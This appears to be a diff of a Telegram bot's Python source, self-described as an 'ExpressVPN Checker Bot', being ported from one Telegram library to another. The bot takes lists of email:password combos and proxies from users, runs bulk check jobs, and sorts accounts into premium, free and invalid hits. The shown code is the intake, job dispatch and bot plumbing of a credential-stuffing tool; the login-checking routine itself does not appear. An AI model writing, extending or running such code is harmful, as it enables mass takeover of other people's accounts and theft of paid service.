-            f"✅ <b>Starting check for {len(combos)} accounts</b>\n\n🔄 Processing...",
-            parse_mode=ParseMode.HTML
-        )
-
-        job = CheckJob(user_id, combos, user_state.proxies.copy(), update.message)
-        user_state.current_job = job
-        user_state.is_processing = True
-        context.user_data['expecting_combos'] = False
-
-        asyncio.create_task(process_job(job, context))
-
-    else:
-        await update.message.reply_text(
-            "📄 <b>Unsupported File</b>\n\nPlease send a .txt file with accounts or proxies.",
-            reply_markup=create_main_menu(user_id),
-            parse_mode=ParseMode.HTML
-        )
-
-async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update.effective_user.id
-
-    if not is_allowed(user_id):
-        await update.message.reply_text("🚫 Access denied.")
-        return
-
-    if bot_state.is_maintenance and not is_admin(user_id):
-        await update.message.reply_text("🔧 Bot is in maintenance mode.")
-        return
-
-    expecting_combos = context.user_data.get('expecting_combos', False)
-
-    if not expecting_combos:
-        await update.message.reply_text(
-            "Use the buttons to navigate or send a .txt file.",
-            reply_markup=create_main_menu(user_id)
-        )
-        return
-
-    user_state = bot_state.get_user(user_id)
-
-    text = update.message.text
-    lines = [line.strip() for line in text.splitlines() if line.strip()]
-    combos = [line for line in lines if ':' in line]
-
-    if not combos:
-        await update.message.reply_text(
-            "❌ No valid combos found.\nFormat: <code>email:password</code>",
-            parse_mode=ParseMode.HTML
-        )
-        return
-
-    if len(combos) > 200:
-        await update.message.reply_text(
-            f"⚠️ Too many combos ({len(combos)}).\nPlease send a .txt file instead."
-        )
-        return
-
-    if not rate_limiter.is_allowed(user_id):
-        await update.message.reply_text(
-            "⏳ Rate limit exceeded. Please wait a moment.",
-            parse_mode=ParseMode.HTML
-        )
-        return
-
-    if user_state.is_processing:
-        await update.message.reply_text(
-            "⏳ Already processing a check!",
-            reply_markup=create_main_menu(user_id)
-        )
-        return
-
-    await update.message.reply_text(
-        f"✅ Starting check for {len(combos)} accounts...",
-        parse_mode=ParseMode.HTML
-    )
-
-    job = CheckJob(user_id, combos, user_state.proxies.copy(), update.message)
-    user_state.current_job = job
-    user_state.is_processing = True
-    context.user_data['expecting_combos'] = False
-
-    asyncio.create_task(process_job(job, context))
-
-# ── Error Handler ──────────────────────────────────────────────────────────
-
-async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    logger.error(f"Update {update} caused error {context.error}")
-
-    error_str = str(context.error)
-    bot_state.error_log.append(f"{datetime.now().strftime('%H:%M:%S')} - {error_str[:100]}")
-    if len(bot_state.error_log) > 1000:
-        bot_state.error_log = bot_state.error_log[-500:]
-
-    if update and update.effective_user:
-        try:
-            await context.bot.send_message(
-                chat_id=update.effective_user.id,
-                text="⚠️ An error occurred. Please try again."
-            )
+            bot.send_message(message.chat.id, summary, reply_markup=main_menu())
         except Exception:
             pass
 
-# ── Main Application ──────────────────────────────────────────────────────
+    t = threading.Thread(target=worker, daemon=True)
+    t.start()
 
-def main():
-    if not BOT_TOKEN:
-        logger.error("BOT_TOKEN not set!")
-        sys.exit(1)
-
-    application = (
-        Application.builder()
-        .token(BOT_TOKEN)
-        .connect_timeout(30.0)
-        .read_timeout(30.0)
-        .write_timeout(30.0)
-        .build()
+@bot.message_handler(func=lambda m: m.text and ":" in m.text and not m.text.startswith("/"))
+def handle_text_combos(message):
+    if not is_allowed(message.from_user.id):
+        return
+    session = get_session(message.chat.id)
+    if session["running"]:
+        bot.reply_to(message, "Job running. Use /stop first.")
+        return
+    
+    lines = [ln.strip() for ln in message.text.splitlines() if ln.strip() and ":" in ln]
+    if not lines:
+        return
+    
+    seen = set()
+    unique = []
+    for ln in lines:
+        if ln not in seen:
+            seen.add(ln)
+            unique.append(ln)
+    
+    session["accounts"] = unique
+    session["premium_hits"] = []
+    session["free_hits"] = []
+    session["invalid_hits"] = []
+    session["stats"] = {
+        "checked": 0,
+        "total": len(unique),
+        "premium": 0,
+        "free": 0,
+        "invalid": 0,
+    }
+    bot.reply_to(
+        message,
+        f"Loaded {len(unique)} accounts.\nUse /check to start.",
+        reply_markup=main_menu()
     )
 
-    application.add_handler(CommandHandler("start", start_command))
-    application.add_handler(CommandHandler("help", help_command))
-    application.add_handler(CommandHandler("stats", stats_command))
-    application.add_handler(CallbackQueryHandler(button_callback))
-    application.add_handler(MessageHandler(filters.Document.ALL, handle_document))
-    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))
-    application.add_error_handler(error_handler)
-
-    logger.info("🚀 Starting ExpressVPN Checker Bot...")
-    logger.info(f"👥 Admin: {ADMIN_IDS[0]}")
-    logger.info(f"📊 Rate limit: {RATE_LIMIT_PER_MINUTE}/min")
-    logger.info(f"🔧 Max threads: {MAX_THREADS}")
-
-    application.run_polling(
-        allowed_updates=Update.ALL_TYPES,
-        drop_pending_updates=True
-    )
+# ─── MAIN ────────────────────────────────────────────────────────────────────
 
 if __name__ == "__main__":
-    main()
+    print("ExpressVPN Bot starting...")
+    print("Author: @X1n0q")
+    try:
+        bot.infinity_polling(timeout=60, long_polling_timeout=60)
+    except KeyboardInterrupt:
+        shutdown_event.set()
+        print("\nShutting down.")
+        sys.exit(0)
